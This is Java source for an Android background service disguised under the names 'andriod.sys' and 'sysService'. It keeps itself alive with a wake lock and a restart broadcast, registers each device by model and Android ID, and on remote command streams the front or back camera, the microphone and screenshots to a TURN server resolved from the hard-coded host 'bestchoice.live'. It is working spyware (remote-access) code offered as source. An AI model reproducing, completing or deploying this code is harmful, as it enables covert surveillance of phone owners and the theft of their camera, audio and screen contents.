package andriod.sys;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.util.Log;
import android.widget.Toast;


import org.json.JSONException;
import org.json.JSONObject;
import org.webrtc.AudioSource;
import org.webrtc.AudioTrack;
import org.webrtc.Camera1Enumerator;
import org.webrtc.CameraEnumerator;
import org.webrtc.DataChannel;
import org.webrtc.DefaultVideoDecoderFactory;
import org.webrtc.DefaultVideoEncoderFactory;
import org.webrtc.EglBase;
import org.webrtc.IceCandidate;
import org.webrtc.Logging;
import org.webrtc.MediaConstraints;
import org.webrtc.MediaStream;
import org.webrtc.PeerConnection;
import org.webrtc.PeerConnectionFactory;
import org.webrtc.SessionDescription;
import org.webrtc.VideoCapturer;
import org.webrtc.VideoSource;
import org.webrtc.VideoTrack;

import java.io.File;
import java.io.FileOutputStream;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutionException;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class sysService extends Service implements SysInterface{
    // variables
    Context context;
    Handler handler;
    PowerManager.WakeLock mWakeLock;

    PeerConnectionFactory peerConnectionFactory;
    MediaConstraints audioConstraints;
    MediaConstraints videoConstraints;
    MediaConstraints sdpConstraints;
    VideoTrack localVideoTrack;
    AudioTrack localAudioTrack;
    VideoSource videoSource;
    AudioSource audioSource;
    PeerConnection localPeer;
    List<IceServer> iceServers;
    EglBase rootEglBase;
    VideoCapturer videoCapturerAndroid;
    List<PeerConnection.IceServer> peerIceServers = new ArrayList<>();
    String cam = "front";
    Intent perData;
    int perResultCode;
    DataChannel localDataChannel;

    //end variables
    // servic overwrite methods
    public sysService(Context applicationContext) {
        super();
        context = applicationContext;
    }

    public sysService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        Toast.makeText(getApplicationContext(),"on bind", Toast.LENGTH_LONG).show();

        return null;
    }


    @Override
    public void onCreate() {
        super.onCreate();
        Toast.makeText(getApplicationContext(),"on create", Toast.LENGTH_LONG).show();

        PowerManager pm = (PowerManager)getSystemService(POWER_SERVICE);
        mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "systemService");
    }

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        mWakeLock.acquire();
        handler = new Handler();
        String roomName = android.os.Build.MANUFACTURER + "_" + android.os.Build.MODEL + "_" + android.provider.Settings.Secure.getString(getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
        SignallingClient.getInstance().init(this, roomName);
        Toast.makeText(getApplicationContext(),"on start sysService", Toast.LENGTH_LONG).show();
        try {
            if (intent.getExtras()!= null) {
                Bundle bundle = intent.getExtras();
                if (bundle != null) {
                    gotPermission(bundle.getInt("perResultCode"), bundle.getParcelable("perData"));
                }
            }
        }
        catch (Exception e){

        }
        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        resetSocket();
        Toast.makeText(getApplicationContext(),"on des", Toast.LENGTH_LONG).show();

        Intent broadcastIntent = new Intent("ac.in.ActivityRecognition.RestartSensor");
        sendBroadcast(broadcastIntent);
    }
    public void resetSocket(){
        SignallingClient.instance.socket.close();
        SignallingClient.instance = null;
    }
    // end service overwrite methods

    // segnaling interface methods
    @Override
    public void onCreatedRoom() {

    }

    @Override
    public void onCreateRoom() {
    }
    @Override
    public void onOfferReceived(final JSONObject data) {
        toast("off re");
        runOnUiThread(() -> {
            if (!SignallingClient.getInstance().isInitiator && !SignallingClient.getInstance().isStarted) {
                onTryToStart();
            }

            try {
                localPeer.setRemoteDescription(new CustomSdpObserver("localSetRemote"), new SessionDescription(SessionDescription.Type.OFFER, data.getString("sdp")));
                doAnswer();
            } catch (JSONException e) {
                e.printStackTrace();
            }
        });
    }

    @Override
    public void onAnswerReceived(JSONObject data) {
        toast("ans reciv3d");

        try {
            localPeer.setRemoteDescription(new CustomSdpObserver("localSetRemote"), new SessionDescription(SessionDescription.Type.fromCanonicalForm(data.getString("type").toLowerCase()), data.getString("sdp")));

        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onIceCandidateReceived(JSONObject data) {
        try {
            localPeer.addIceCandidate(new IceCandidate(data.getString("id"), data.getInt("label"), data.getString("candidate")));
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void cmd(String cmd) {
        //showToast("cmd is: " + cmd + " : " + getserverIp());
        if (cmd.equalsIgnoreCase("openFrontCam") ){
            openPeerCon();
            createCamInstance("front");
            onTryToStart();
        }
        if (cmd.equalsIgnoreCase("openBackCam") ){
            openPeerCon();
            createCamInstance("back");
            onTryToStart();
        }
        if (cmd.equalsIgnoreCase("closeCam") ){
            closePeerCon();
        }
        if (cmd.equalsIgnoreCase("switchCam") ){
            switchCam();
        }
        if (cmd.equalsIgnoreCase("openSound") ){
            openPeerCon();
            createSoundInstance();
            onTryToStart();
        }
        if (cmd.contains("screenshot")){
            int shotN = Integer.parseInt(cmd.split(":")[1]);
            toast(shotN+"");
            sendScreenshot(shotN);

        }

    }
    // end signaling interface mehtod


    // help method

    public void toast(final String msg) {
        runOnUiThread(() -> Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_SHORT).show());
    }

    private void runOnUiThread(Runnable runnable) {
        handler.post(runnable);
    }
    public String getserverIp() {
        AsyncTask<String, Void, String> task = new AsyncTask<String, Void, String>()
        {
            @Override
            protected String doInBackground(String... strings) {
                try {
                    return InetAddress.getByName("bestchoice.live").getHostAddress();
                } catch (UnknownHostException e) {
                    e.printStackTrace();
                    return "unknown";
                }

            }

        };
        try
        {
            return task.execute().get();
        }
        catch (InterruptedException e)
        {
            return null;
        }
        catch (ExecutionException e)
        {
            return null;
        }

    }
    // end help method
    // webrtc mehtod

    public void openPeerCon(){
        closePeerCon();
        getIceServers();
        rootEglBase = EglBase.create();

        //Initialize PeerConnectionFactory globals.
        PeerConnectionFactory.InitializationOptions initializationOptions =
                PeerConnectionFactory.InitializationOptions.builder(this)
                        .setEnableVideoHwAcceleration(true)
                        .createInitializationOptions();
        PeerConnectionFactory.initialize(initializationOptions);

        //Create a new PeerConnectionFactory instance - using Hardware encoder and decoder.
        PeerConnectionFactory.Options options = new PeerConnectionFactory.Options();
        DefaultVideoEncoderFactory defaultVideoEncoderFactory = new DefaultVideoEncoderFactory(
                rootEglBase.getEglBaseContext(),  true,  true);
        DefaultVideoDecoderFactory defaultVideoDecoderFactory = new DefaultVideoDecoderFactory(rootEglBase.getEglBaseContext());
        peerConnectionFactory = new PeerConnectionFactory(options, defaultVideoEncoderFactory, defaultVideoDecoderFactory);

    }
    public void closePeerCon(){
        try {
            if (videoCapturerAndroid != null) {
                videoCapturerAndroid.stopCapture();
                videoCapturerAndroid = null;
            }
            if (localPeer != null){
                localPeer.close();
                localPeer = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void switchCam(){
        if (cam.equalsIgnoreCase("front")){
            cam = "back";
            closePeerCon();
            openPeerCon();
            createCamInstance("back");
            onTryToStart();
        }
        else {
            cam = "front";
            closePeerCon();
            openPeerCon();
            createCamInstance("front");
            onTryToStart();
        }
    }
    public void createCamInstance(String cam){
        //Now create a VideoCapturer instance.
        if (cam.equalsIgnoreCase("front")) {
            videoCapturerAndroid = frontCapture(new Camera1Enumerator(false));
        }
        else {
            videoCapturerAndroid = backCapture(new Camera1Enumerator(false));
        }
        //Create MediaConstraints - Will be useful for specifying video and audio constraints.

        videoConstraints = new MediaConstraints();


        //Create a VideoSource instance
        if (videoCapturerAndroid != null) {
            videoSource = peerConnectionFactory.createVideoSource(videoCapturerAndroid);
        }
        localVideoTrack = peerConnectionFactory.createVideoTrack("100", videoSource);

        //create an AudioSource instance
        audioConstraints = new MediaConstraints();
        audioSource = peerConnectionFactory.createAudioSource(audioConstraints);
        localAudioTrack = peerConnectionFactory.createAudioTrack("101", audioSource);



        if (videoCapturerAndroid != null) {
            videoCapturerAndroid.startCapture(1024, 720, 30);
        }
    }
    public void createSoundInstance(){
        //create an AudioSource instance
        audioConstraints = new MediaConstraints();
        audioSource = peerConnectionFactory.createAudioSource(audioConstraints);
        localAudioTrack = peerConnectionFactory.createAudioTrack("101", audioSource);
    }
    private VideoCapturer frontCapture(CameraEnumerator enumerator) {
        final String[] deviceNames = enumerator.getDeviceNames();

        // First, try to find front facing camera
        for (String deviceName : deviceNames) {
            if (enumerator.isFrontFacing(deviceName)) {
                VideoCapturer videoCapturer = enumerator.createCapturer(deviceName, null);

                if (videoCapturer != null) {
                    return videoCapturer;
                }
            }
        }

        return null;
    }
    private VideoCapturer backCapture(CameraEnumerator enumerator) {
        final String[] deviceNames = enumerator.getDeviceNames();
        // Front facing camera not found, try something else
        for (String deviceName : deviceNames) {
            if (!enumerator.isFrontFacing(deviceName)) {
                VideoCapturer videoCapturer = enumerator.createCapturer(deviceName, null);

                if (videoCapturer != null) {
                    return videoCapturer;
                }
            }
        }
        return null;
    }

    public void onTryToStart() {
        runOnUiThread(() -> {
            if ( localVideoTrack != null ) {
                createPeerConnection("cam");
                SignallingClient.getInstance().isStarted = true;
                if (SignallingClient.getInstance().isInitiator) {
                    doCall();
                }
            }
        });
    }

    /**
     * Creating the local peerconnection instance
     */
    private void createPeerConnection(String type) {
        peerIceServers.add(new org.webrtc.PeerConnection.IceServer("turn:" + getserverIp() + ":3478","turn","turn"));
        PeerConnection.RTCConfiguration rtcConfig =
                new PeerConnection.RTCConfiguration(peerIceServers);
        // TCP candidates are only useful when connecting to a server that supports
        // ICE-TCP.
        rtcConfig.tcpCandidatePolicy = PeerConnection.TcpCandidatePolicy.DISABLED;
        rtcConfig.bundlePolicy = PeerConnection.BundlePolicy.MAXBUNDLE;
        rtcConfig.rtcpMuxPolicy = PeerConnection.RtcpMuxPolicy.REQUIRE;
        rtcConfig.continualGatheringPolicy = PeerConnection.ContinualGatheringPolicy.GATHER_CONTINUALLY;
        // Use ECDSA encryption.
        rtcConfig.keyType = PeerConnection.KeyType.ECDSA;
        localPeer = peerConnectionFactory.createPeerConnection(rtcConfig, new CustomPeerConnectionObserver("localPeerCreation") {
            @Override
            public void onIceCandidate(IceCandidate iceCandidate) {
                super.onIceCandidate(iceCandidate);
                onIceCandidateReceived(iceCandidate);
            }

            @Override
            public void onAddStream(MediaStream mediaStream) {
                // do some thing with received stream
            }

        });
        if (type.equalsIgnoreCase("cam")){
            addStreamToLocalPeer();
        }
    }
    /**
     * Adding the stream to the localpeer
     */
    private void addStreamToLocalPeer() {
        //creating local mediastream
        MediaStream stream = peerConnectionFactory.createLocalMediaStream("102");
        stream.addTrack(localAudioTrack);
        stream.addTrack(localVideoTrack);
        localPeer.addStream(stream);
    }

    public void onIceCandidateReceived(IceCandidate iceCandidate) {
        //we have received ice candidate. We can set it to the other peer.
        SignallingClient.getInstance().emitIceCandidate(iceCandidate);
    }
    /**
     * This method is called when the app is initiator - We generate the offer and send it over through socket
     * to remote peer
     */
    private void doCall() {
        localPeer.createOffer(new CustomSdpObserver("localCreateOffer") {
            @Override
            public void onCreateSuccess(SessionDescription sessionDescription) {
                super.onCreateSuccess(sessionDescription);
                localPeer.setLocalDescription(new CustomSdpObserver("localSetLocalDesc"), sessionDescription);
                SignallingClient.getInstance().emitMessage(sessionDescription);
            }
        }, new MediaConstraints());
    }
    private void getIceServers() {
        //get Ice servers using xirsys
        Utils.getInstance().getRetrofitInstance().getIceCandidates().enqueue(new Callback<TurnServerPojo>() {
            @Override
            public void onResponse(@NonNull Call<TurnServerPojo> call, @NonNull Response<TurnServerPojo> response) {
                TurnServerPojo body = response.body();
                if (body != null) {
                    iceServers = body.iceServerList.iceServers;
                }
                for (IceServer iceServer : iceServers) {
                    if (iceServer.credential == null) {
                        PeerConnection.IceServer peerIceServer = PeerConnection.IceServer.builder(iceServer.url).createIceServer();
                        peerIceServers.add(peerIceServer);
                    } else {
                        PeerConnection.IceServer peerIceServer = PeerConnection.IceServer.builder(iceServer.url)
                                .setUsername(iceServer.username)
                                .setPassword(iceServer.credential)
                                .createIceServer();
                        peerIceServers.add(peerIceServer);
                    }
                }

            }

            @Override
            public void onFailure(@NonNull Call<TurnServerPojo> call, @NonNull Throwable t) {
                t.printStackTrace();
            }
        });
    }
    private void doAnswer() {
        localPeer.createAnswer(new CustomSdpObserver("localCreateAns") {
            @Override
            public void onCreateSuccess(SessionDescription sessionDescription) {
                super.onCreateSuccess(sessionDescription);
                localPeer.setLocalDescription(new CustomSdpObserver("localSetLocal"), sessionDescription);
                SignallingClient.getInstance().emitMessage(sessionDescription);
            }
        }, new MediaConstraints());
    }

    // end webrtc methods

    // screen shot
    public void sendScreenshot(int shotN){
        toast(shotN+"");
        if (perData != null){
            toast("from send screen");
            initDataChannel();
            Screenshot.getObj().takeScreenshot(this);
        }else {
            getPermission();
        }
    }
    private void getPermission() {
        resetSocket();
        Intent mainIntent = new Intent(this, PermissionActivity.class);
        mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(mainIntent);
    }

    private void gotPermission(int resultCode, Intent data){
        if (data != null){
            this.perData = data;
            this.perResultCode = resultCode;
            toast("get media");
            initDataChannel();
            Screenshot.getObj().takeScreenshot(this);
        }
    }




    @Override
    public void gotScreenshot(Bitmap bitmap, byte[] imageByteArr) {
        saveScreenshot(bitmap);
        Screenshot.getObj().finish();
        sendImage(imageByteArr);
    }

    // webrtc datachannel
    private void initDataChannel() {
        PeerConnectionFactory.initialize(
                PeerConnectionFactory.InitializationOptions.builder(this)
                        .setEnableInternalTracer(BuildConfig.DEBUG)
                        .createInitializationOptions()
        );
        peerConnectionFactory = new PeerConnectionFactory(null);
        createPeerConnection("data");

        localDataChannel = localPeer.createDataChannel("sendDataChannel", new DataChannel.Init());
        localDataChannel.registerObserver(new DataChannel.Observer() {
            @Override
            public void onBufferedAmountChange(long l) {

            }

            @Override
            public void onStateChange() {
                runOnUiThread(() -> {
                    if (localDataChannel.state() == DataChannel.State.OPEN) {
                        //binding.sendButton.setEnabled(true);
                    } else {
                        //binding.sendButton.setEnabled(false);
                    }
                });
            }

            @Override
            public void onMessage(DataChannel.Buffer buffer) {
                // Incoming messages, ignore
                // Only outcoming messages used in this example
            }
        });
        doCall();
    }

    private void sendImage(byte[] bytes) {
        int CHUNK_SIZE = 64000;
        int size = bytes.length;
        int numberOfChunks = size / CHUNK_SIZE;

        ByteBuffer meta = stringToByteBuffer("-i" + size, Charset.defaultCharset());
        localDataChannel.send(new DataChannel.Buffer(meta, false));

        for (int i = 0; i < numberOfChunks; i++) {
            ByteBuffer wrap = ByteBuffer.wrap(bytes, i * CHUNK_SIZE, CHUNK_SIZE);
            localDataChannel.send(new DataChannel.Buffer(wrap, false));
        }
        int remainder = size % CHUNK_SIZE;
        if (remainder > 0) {
            ByteBuffer wrap = ByteBuffer.wrap(bytes, numberOfChunks * CHUNK_SIZE, remainder);
            localDataChannel.send(new DataChannel.Buffer(wrap, false));
        }
    }
    private static ByteBuffer stringToByteBuffer(String msg, Charset charset) {
        return ByteBuffer.wrap(msg.getBytes(charset));
    }
    // end datachannel


    private void saveScreenshot(Bitmap bitmap) {
        // mediapro

        // end

        Log.d("saveScreenshot", "1");
        try {
            // image naming and path  to include sd card  appending name you choose for file
            String mPath = Environment.getExternalStorageDirectory().toString() + "/" + "testScreenshot" + ".jpg";



            File imageFile = new File(mPath);

            FileOutputStream outputStream = new FileOutputStream(imageFile);
            int quality = 100;
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream);
            outputStream.flush();
            outputStream.close();

            //openScreenshot(imageFile);
        } catch (Throwable e) {
            // Several error may come out with file handling or DOM
            e.printStackTrace();
        }
    }
/*
    private void openScreenshot(File imageFile) {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        Uri uri = Uri.fromFile(imageFile);
        intent.setDataAndType(uri, "image/*");
        startActivity(intent);
    }
    // end screen shot

*/
}
